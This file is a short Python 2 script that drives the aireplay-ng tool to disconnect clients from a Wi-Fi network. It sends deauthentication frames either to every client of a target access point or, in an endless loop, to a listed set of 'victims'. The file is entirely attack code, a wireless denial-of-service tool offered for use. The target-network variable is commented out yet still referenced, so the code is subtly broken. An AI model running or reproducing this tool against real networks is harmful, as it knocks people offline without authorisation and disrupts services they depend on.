#! /usr/bin/env python
import subprocess
import signal
import sys

victims = []
#network = "00:00:00:00:00:00"
#victims = [
#    "00:00:00:00:00:11", 
#    "00:00:00:00:00:22", 
#    "00:00:00:00:00:33", 
#    "00:00:00:00:00:44", 
#    "00:00:00:00:00:55"] 

interface = "eth0"

def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit(0)

def deauth_all_clients(net):
    command = "aireplay-ng --deauth 0 -a {0} {1}".format(net, interface)
    print "[+] Deauthenticating all clients in the network"
    print "[!] You may as well run aireplay-ng directly: [{0}]\n".format(command)
    subprocess.call([command], shell=True) 

def deauth_client(net, cli):
    print "\n[+] Deauthenticating {0}\n".format(cli)
    command = "aireplay-ng --deauth 3 -a {0} -c {1} {2}".format(net, cli, interface)
    subprocess.call([command], shell=True)

if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    print "[+] Target Network:\n\t{0}".format(network)

    if len(victims) == 0:
        deauth_all_clients(network) 
        sys.exit(1)

    print "[+] Target Clients:"
    for i in range(0, len(victims)):
        print "\t{0}".format(victims[i])
    while True:
        for i in range(0, len(victims)):
            deauth_client(network, victims[i])
